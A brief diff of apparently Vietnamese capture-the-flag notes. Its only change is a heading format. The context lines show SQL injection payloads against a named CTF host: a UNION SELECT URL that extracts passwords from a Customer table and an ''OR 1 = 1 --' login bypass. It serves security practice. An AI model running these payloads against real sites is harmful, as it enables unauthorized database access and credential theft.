@@ -16,7 +16,7 @@ https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', column
 https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', password, '3', '4' from Customer
 
 
-*CTF4 - Picture Gallery
+###CTF4 - Picture Gallery
 - Hiển thị tất cả các ảnh 
 'OR 1 = 1 -- 
 - Kiểm tra số cột 
